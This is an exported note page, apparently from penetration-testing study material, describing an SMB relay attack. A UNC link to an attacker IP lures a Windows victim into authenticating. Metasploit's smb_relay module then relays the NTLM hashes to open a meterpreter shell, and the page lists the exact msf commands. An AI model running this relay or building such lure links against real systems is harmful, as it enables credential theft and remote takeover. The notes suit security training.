<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Get a Shell: redirect to Attacker's SMB share using UNC path</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Get a Shell: redirect to Attacker's SMB share using UNC path</h1><br/><br />Similar to <a href="Sign-On(SSO)_implementation_of_Windows_in_order_to_capture_NTLM_hashes--Capture_the_Hahes_redirect_to_Attacker's_SMB_share_using_UNC_path.html">Capture the Hahes: redirect to Attacker&#39;s SMB share using UNC path</a> but here we are are launching directly a Shell on the target machine<br /><br /><strong><h3>Force the client (target) to start a connection to us (fake server)</h3></strong><br />With this approach, the attacker might even force the client to use a weaker and more easily cracked password hash mechanism(LANMAN Challenge/Response or NTLMv1).<br />    <span style="color:#a5452a;">example:</span><br />    1. Create a fake Server<br />    2. To force an SMB authentication is possible to embed a UNC path \\SERVER\SHARE (that can be written also as file://[AttackerIP]/[AttackerShare] in an email or web page<br />    3. When the victim click on the link, the victim&#39;s machine will try to mount a share on the attacker&#39;s machine, performing Windows authentication with it.<br />    <strong>4.</strong> Now we should have received a SMB session from the victim. This SMB session started when the user clicked our malicious link \\172.16.5.150\admin$ which carries the credentials (NTLM hashes) that were in use by the victim. The hashes obtained is are used by the smb-relay exploit in order to launch the payload<br />and get a meterpreter shell in our victimâ€™s system.<br /><br /><br /><br /><strong><h3>How:</h3></strong><br /><div class="codebox"><pre>msf&gt; use exploit<span style="color:#ff9d00;font-weight:700">/</span>windows<span style="color:#ff9d00;font-weight:700">/</span>smb<span style="color:#ff9d00;font-weight:700">/</span>smb_relay<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> SRVHOST &lt;attacker_interface_ip&gt;<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> LHOST &lt;attacker_interface_ip&gt;<br /></pre></div><br />    <a href=""><img src="images/2110-1.png" alt="images/2110-1.png" /></a><br />    <a href=""><img src="images/2110-2.png" alt="images/2110-2.png" /></a><br /><br />When the target will click on  \\172.16.5.150\admin$ we should receive the hashes and exploit the target system<br /><a href=""><img src="images/2110-3.png" alt="images/2110-3.png" /></a><br />A lot of authentications can occur from the target but the sessions is been established(CTRL-C to exit from the exploit)<br /><div class="codebox"><pre>msf&gt; sessions<br />msf&gt; sessions [<span style="color:#ff9d00;font-weight:700">id</span>]</pre></div><br /><a href=""><img src="images/2110-4.png" alt="images/2110-4.png" /></a><br /><br />Now that we have get the meterpreter shell we can close the smb relay job<br /><div class="codebox"><pre>msf&gt; <span style="color:#ff9d00;font-weight:700">jobs</span><br />msf&gt; <span style="color:#ff9d00;font-weight:700">jobs</span> -k [<span style="color:#ff9d00;font-weight:700">id</span>]</pre></div><br /><a href=""><img src="images/2110-5.png" alt="images/2110-5.png" /></a><br /><br /></div>
</body>
</html>
